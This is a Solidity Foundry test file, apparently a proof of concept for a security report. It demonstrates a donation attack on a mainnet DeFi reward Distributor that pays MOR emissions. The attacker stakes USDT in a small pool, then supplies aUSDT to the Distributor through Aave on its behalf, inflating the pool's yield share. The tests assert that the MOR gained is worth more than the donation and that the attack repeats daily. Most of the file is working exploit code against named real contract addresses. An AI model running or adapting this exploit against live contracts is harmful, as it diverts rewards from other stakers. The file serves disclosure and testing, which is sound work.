// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IDepositPool, IDistributor, IAavePool, IAaveAddressesProvider, ILido, IRewardPool, IAggregator} from "../src/Interfaces.sol";

/// @notice PoC: Distributor yield-share can be inflated by direct donation of yield tokens,
///         letting a staker in a small pool buy MOR emission at a steep discount.
///         Fork: Ethereum mainnet @ 26460436 (2026-11-21 02:18 UTC).
///         Run: forge test --match-contract DonationAttack -vv
contract DonationAttackTest is Test {

    /// USDT-style tokens return no bool from approve; use low-level call.
    function _approve(address token, address spender, uint256 amount) internal {
        (bool ok, ) = token.call(abi.encodeWithSignature("approve(address,uint256)", spender, amount));
        require(ok, "approve failed");
    }
    uint256 constant FORK_BLOCK = 26460436;
    string constant RPC = "https://ethereum-rpc.publicnode.com";

    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant REWARD_POOL = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant USDT_POOL = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;
    address constant STETH_POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant WBTC_POOL = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant WETH_POOL = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant USDC_POOL = 0x6cCE082851Add4c535352f596662521B4De4750E;

    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    // MOR market price 2026-11-21 ~ $0.63 (TheBlock/CoinCodex/WEEX), 18-dec USD
    uint256 constant MOR_PRICE_USD = 0.63e18;

    address attacker = makeAddr("attacker");
    IDistributor distributor = IDistributor(DISTRIBUTOR);
    IDepositPool usdtPool = IDepositPool(USDT_POOL);

    function setUp() public {
        vm.createSelectFork(RPC, FORK_BLOCK);
    }


    /// On a fork, Chainlink rounds do not advance when time is warped, so every feed
    /// would go stale and distributeRewards would revert. Live feeds update at least
    /// hourly; simulate that by re-serving the *same* fork-block answers with a fresh
    /// updatedAt after each warp. Prices are unchanged; only the timestamp moves.
    function _refreshChainlink() internal {
        address[6] memory feeds = [
            0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8, // stETH/USD
            0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419, // ETH/USD
            0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23, // wBTC/BTC
            0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c, // BTC/USD
            0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6, // USDC/USD
            0x3E7d1eAB13ad0104d2750B8863b489D65364e32D  // USDT/USD
        ];
        for (uint256 i = 0; i < feeds.length; i++) {
            (uint80 roundId, int256 answer, uint256 startedAt, , uint80 answeredInRound) =
                IAggregator(feeds[i]).latestRoundData();
            vm.mockCall(
                feeds[i],
                abi.encodeWithSignature("latestRoundData()"),
                abi.encode(roundId, answer, startedAt, block.timestamp, answeredInRound)
            );
        }
    }

    function _aavePool() internal view returns (address) {
        return IAaveAddressesProvider(distributor.aavePoolAddressesProvider()).getPool();
    }

    /// @dev Simulate one day of *natural* yield for the non-target pools, at live APYs
    ///      read on-chain at the fork block (stETH ~2.7% on 3581 stETH; Aave USDC 2.364%
    ///      on $426,865; WETH 1.486% on $17,696; WBTC ~0). On a fork, stETH rebases and
    ///      Aave index accrual do not auto-apply, so we inject the equivalent amounts
    ///      through the same balance channel the Distributor measures. This makes the
    ///      fork numbers approximate live-chain economics instead of overstating the attack.
    function _injectNaturalYield() internal {
        // stETH daily rebase ~= 3581.8 * 2.7% / 365 ~= 0.265 stETH (~$429)
        vm.deal(address(this), 1 ether);
        ILido(STETH).submit{value: 0.27 ether}(address(0));
        IERC20(STETH).transfer(DISTRIBUTOR, 0.265 ether);
        // USDC Aave daily yield ~= $27.6
        deal(USDC, address(this), 28e6);
        _approve(USDC, _aavePool(), 28e6);
        IAavePool(_aavePool()).supply(USDC, 28e6, DISTRIBUTOR, 0);
        // WETH Aave daily yield ~= $0.72
        deal(WETH, address(this), 0.001 ether);
        _approve(WETH, _aavePool(), 0.00045 ether);
        IAavePool(_aavePool()).supply(WETH, 0.00045 ether, DISTRIBUTOR, 0);
    }

    function test_DonationInflatesYieldShare_USDT() public {
        // ---- setup: attacker stakes 100k USDT into the small USDT pool (TVL ~4.7k USDT) ----
        deal(USDT, attacker, 400_000e6);
        vm.startPrank(attacker);
        _approve(USDT, DISTRIBUTOR, type(uint256).max);
        usdtPool.stake(0, 100_000e6, 0, address(0)); // 1x multiplier, no referrer
        vm.stopPrank();

        (, , uint256 totalVirtual) = usdtPool.rewardPoolsData(0);
        (, , , , , , uint256 attackerVirtual, , ) = usdtPool.usersData(attacker, 0);
        console2.log("USDT pool totalVirtualDeposited (6dec):", totalVirtual);
        console2.log("attacker virtualDeposited (6dec):", attackerVirtual);
        console2.log("attacker share of pool virtual (bps):", (attackerVirtual * 10_000) / totalVirtual);

        uint256 usdtPoolMorBefore = distributor.getDistributedRewards(0, USDT_POOL);
        uint256 stethPoolMorBefore = distributor.getDistributedRewards(0, STETH_POOL);
        uint256 pendingBefore = usdtPool.getLatestUserReward(0, attacker);
        assertEq(pendingBefore, 0, "attacker must start with 0 pending");

        // ---- one day passes; natural yield accrues to all pools ----
        vm.warp(block.timestamp + 86_401);
        _refreshChainlink();
        _injectNaturalYield();

        // ---- attack: donate $500 of "yield" (aUSDT via Aave supply onBehalfOf Distributor) ----
        uint256 donation = 500e6; // $500 USDT
        vm.startPrank(attacker);
        _approve(USDT, _aavePool(), donation);
        IAavePool(_aavePool()).supply(USDT, donation, DISTRIBUTOR, 0);
        vm.stopPrank();

        // ---- trigger distribution (anyone can call) ----
        distributor.distributeRewards(0);

        uint256 usdtPoolMorDelta = distributor.getDistributedRewards(0, USDT_POOL) - usdtPoolMorBefore;
        uint256 stethPoolMorDelta = distributor.getDistributedRewards(0, STETH_POOL) - stethPoolMorBefore;
        uint256 pendingAfter = usdtPool.getLatestUserReward(0, attacker);

        uint256 periodRewards = IRewardPool(REWARD_POOL).getPeriodRewards(
            0,
            uint128(block.timestamp - 86_401),
            uint128(block.timestamp)
        );

        console2.log("period MOR emission (pool 0):", periodRewards / 1e18);
        console2.log("USDT pool MOR delta:", usdtPoolMorDelta / 1e18);
        console2.log("stETH pool MOR delta:", stethPoolMorDelta / 1e18);
        console2.log("attacker pending MOR:", pendingAfter / 1e18);

        uint256 attackerMorUsd = (pendingAfter * MOR_PRICE_USD) / 1e18; // 18-dec USD
        uint256 donationUsd = donation * 1e12; // 6dec -> 18dec USD
        console2.log("attacker MOR value USD (18dec):", attackerMorUsd);
        console2.log("donation USD (18dec):", donationUsd);
        console2.log("profit multiple x100:", (attackerMorUsd * 100) / donationUsd);

        // Core assertion: MOR entitlement bought with the donation is worth more than the donation.
        assertGt(attackerMorUsd, donationUsd, "donation must buy MOR worth more than its cost");
        // USDT pool (natural yield ~$0.38/day) must capture a large share of the day's emission.
        assertGt(usdtPoolMorDelta * 3, periodRewards, "USDT pool captures >1/3 of emission via donation");
    }

    function test_DonationAttackRepeatable() public {
        deal(USDT, attacker, 400_000e6);
        vm.startPrank(attacker);
        _approve(USDT, DISTRIBUTOR, type(uint256).max);
        usdtPool.stake(0, 100_000e6, 0, address(0));
        vm.stopPrank();

        uint256 totalDonatedUsd = 0;
        for (uint256 day = 0; day < 3; day++) {
            vm.warp(block.timestamp + 86_401);
            _refreshChainlink();
            _injectNaturalYield();
            uint256 donation = 500e6;
            totalDonatedUsd += donation * 1e12;
            vm.startPrank(attacker);
            _approve(USDT, _aavePool(), donation);
            IAavePool(_aavePool()).supply(USDT, donation, DISTRIBUTOR, 0);
            vm.stopPrank();
            distributor.distributeRewards(0);
        }

        uint256 pending = usdtPool.getLatestUserReward(0, attacker);
        uint256 pendingUsd = (pending * MOR_PRICE_USD) / 1e18;
        console2.log("3-day attacker pending MOR:", pending / 1e18);
        console2.log("3-day pending USD (18dec):", pendingUsd);
        console2.log("3-day donated USD (18dec):", totalDonatedUsd);
        assertGt(pendingUsd, totalDonatedUsd, "repeatable: 3 days of donations buy MOR worth more than cost");
    }
}
